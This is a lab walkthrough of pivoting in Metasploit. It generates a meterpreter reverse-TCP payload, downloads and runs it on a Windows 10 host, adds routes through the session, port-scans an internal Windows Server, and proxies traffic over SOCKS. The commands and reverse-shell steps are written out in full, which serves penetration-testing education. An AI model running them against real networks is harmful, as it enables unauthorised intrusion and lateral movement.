# Pivoting in Metasploit

## Test Environment 

- **Attacker**: Kali Linux 2025.2 (10.0.2.13)
- **Pivot**: Windows 10 Enterprise (172.16.0.101, 10.0.2.14)
- **Target**: Windows Server 2025 (172.16.0.1)

## Compromising The Target

For simplicity, we disabled Microsoft Defender on the Windows 10 VM and used msfvenom to compile a Windows meterpreter staged reverse tcp payload.

```bash
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.13 LPORT=4444 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
We can then start a python server on the attacker machine and download the payload on the target using PowerShell.

```bash
PS C:\Users\j-doe\Desktop> Invoke-WebRequest http://10.0.2.13:8080/shell.exe -OutFile shell.exe
```
```bash
┌──(kali㉿kali)-[~]
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.0.2.14 - - [02/Nov/2025 14:12:48] "GET /shell.exe HTTP/1.1" 200 -
10.0.2.14 - - [02/Nov/2025 14:14:50] "GET /shell.exe HTTP/1.1" 200 -
```
We had already set up a Metasploit listener and the target establishes a connection once shell.exe is executed.

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.0.2.13; set lport 4444; exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
lhost => 10.0.2.13
lport => 4444
[*] Started reverse TCP handler on 10.0.2.13:4444 
[*] Sending stage (203846 bytes) to 10.0.2.14
[*] Meterpreter session 1 opened (10.0.2.13:4444 -> 10.0.2.14:57712) at 2025-11-02 14:22:58 -0500

meterpreter > sysinfo
Computer        : WIN10
OS              : Windows 10 22H2+ (10.0 Build 19045).
Architecture    : x64
System Language : en_GB
Domain          : LAB
Logged On Users : 7
Meterpreter     : x64/windows
```
## Autoroute

Using the module ```post/multi/manage/autoroute```, we are able to add routes for the target to Metasploit’s routing table, enabling pivoting to private networks accessible by the compromised host.

```bash
meterpreter > bg
[*] Backgrounding session 1...
msf exploit(multi/handler) > use post/multi/manage/autoroute
msf post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf post(multi/manage/autoroute) > set SUBNET 172.16.0.0
SUBNET => 172.16.0.0
msf post(multi/manage/autoroute) > run
[*] Running module against WIN10 (10.0.2.14)
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.0.2.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 172.16.0.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

We now have 2 route table entries within Metasploit’s routing table linked to session 1 (WIN10) that will allow us to use this host as a pivot to reach our actual target, which in this case is a Windows 2025 Server VM. For example, we can scan for open ports:

```bash
msf auxiliary(scanner/portscan/tcp) > run
[+] 172.16.0.1            - 172.16.0.1:53 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:80 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:88 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:135 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:139 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:389 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:445 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:464 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:593 - TCP OPEN
[+] 172.16.0.1            - 172.16.0.1:636 - TCP OPEN
```
## SOCKS Server Module

If we want to route external applicatons' TCP/IP traffic through Metasploit’s routing tables, we can use the module ```auxiliary/server/socks_proxy``` to start a SOCKS proxy server.

```bash
msf auxiliary(scanner/portscan/tcp) > use auxiliary/server/socks_proxy
msf auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1
msf auxiliary(server/socks_proxy) > set SRVPORT 1337
SRVPORT => 1337
msf auxiliary(server/socks_proxy) > run -j
[*] Auxiliary module running as background job 0.
msf auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
```
We can now set up proxychains-ng to use the SOCKS5 server we just started by adding ```socks5 127.0.0.1 1337``` to ```/etc/proxychains.conf``` if you choose to install it, otherwise ```src/proxychains.conf``` in the build directory. For example, we can run curl to send a HTTP request to the web server running on port 80.

```bash
┌──(kali㉿kali)-[~/proxychains-ng]
└─$ ./proxychains4 -f src/proxychains.conf curl http://172.16.0.1/
[proxychains] config file found: src/proxychains.conf
[proxychains] preloading ./libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-5-gcc005b7
[proxychains] Strict chain  ...  127.0.0.1:1337  ...  172.16.0.1:80  ...  OK
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>IIS Windows Server</title>
<style type="text/css">
<!--
body {
        color:#000000;
        background-color:#0072C6;
        margin:0;
}

#container {
        margin-left:auto;
        margin-right:auto;
        text-align:center;
        }

a img {
        border:none;
}

-->
</style>
</head>
<body>
<div id="container">
<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img src="iisstart.png" alt="IIS" width="960" height="600" /></a>
</div>
</body>
</html>                                                                                                                                                 
```
